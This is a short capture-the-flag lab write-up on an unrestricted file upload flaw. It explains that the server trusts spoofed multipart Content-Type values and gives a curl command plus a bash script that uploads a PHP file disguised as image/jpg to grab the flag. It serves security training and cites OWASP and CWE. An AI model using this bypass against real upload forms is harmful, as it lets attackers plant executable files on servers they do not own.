# Unrestricred File Upload

When browser create request on submit event of the form of the upload page, it uses `Content-type: multipart/form-data`.

The request looks like this:
```
POST http://192.168.64.4/index.php?page=upload HTTP/1.1
...
Content-Type: multipart/form-data; boundary =------------------------2af838c4b69e7ad8
...

--------------------------2af838c4b69e7ad8
Content-Disposition: form-data;
name="uploaded";
filename="pic.jpg"
Content-Type: image/jpg

hello

--------------------------2af838c4b69e7ad8
Content-Disposition: form-data;
name="Upload"

Upload
--------------------------2af838c4b69e7ad8--
```

To exploit this vulnerability we need to upload non-image file and make the server think that the file is an image. <br>
To do that, we need to change `Content-type` inside each part of multipart POST request.

This could be easily performed with `curl`. 
```bash
curl -F "uploaded=@path-to-file;type=any-mime-type-you-want-to-fake"
```

<details>
    <summary>Shell script that does the trick</summary>

```bash
#!/bin/bash

echo 'echo hello' > /$HOME/index.php

curl -s -F "uploaded=@$HOME/index.php;type=image/jpg" -F "Upload=Upload" "http://$IPADDR/index.php?page=upload" | grep flag
```

</details>

## References
- [Unrestricted File Upload — OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)